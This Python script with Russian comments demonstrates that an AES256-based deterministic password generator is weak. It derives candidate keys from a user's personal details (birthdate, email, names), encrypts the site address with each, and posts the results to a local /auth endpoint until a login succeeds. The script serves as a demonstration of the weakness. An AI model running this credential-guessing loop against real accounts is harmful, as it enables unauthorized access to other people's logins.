#                   Андрей Мигачев
# Очень часто чтоб не заморачиваться с запоминанием паролей
# используют генератор паролей. Я взял для опытов генератор
# на основе AES256. Eсли зашифровать адрес 127.0.0.1:5000
# без секретного ключа '', всегда получится: U2FsdGVkX1/RU3XSY3HlT94H4kLOyqkADruV1wWmO4w=
# Это небезопасно. При дешифровке с не верным ключем, выдаст b''
# Поэтому имя сайта склеивают с дополнительным ключем усложнив пароль на выходе
# (email, имя, фамилия, дата рождения)/ К примеру текст шифра '127.0.0.1:5000' ключ 'Аndrey'
# пройдя через генератор получим -> U2FsdGVkX1/FHR6swgDRSJNp4bC5e5kQJGlSynPZsiY=
# (запомнить сложно, подобрать нереально). Но зная данные пользователя
# и сайт мы всегда сможем подобрать ключ от сайта.
import requests
from AesEverywhere import aes256

admin_data = '''01.03.1980
1марта1980
admin@gmail.com
admin
migachev
Migachev
andrey
Andrey'''

admin_key = admin_data.split('\n')
i = 0

def generate_bad_password():
    global i

    if i >= len(admin_key):
        return

    key = admin_key[i]
    i += 1
    return key


while True:
    key = generate_bad_password()
    if key is None:
        break

    password = aes256.encrypt('127.0.0.1:5000', key).decode()  # Вот сюда (key) подставляем известные значения
    print(key, password)
    data = {'login': 'admin', 'password': password}
    response = requests.post('http://127.0.0.1:5000/auth', json=data)
    if response.status_code == 200:
        print('SUCCESS!', password)
        break






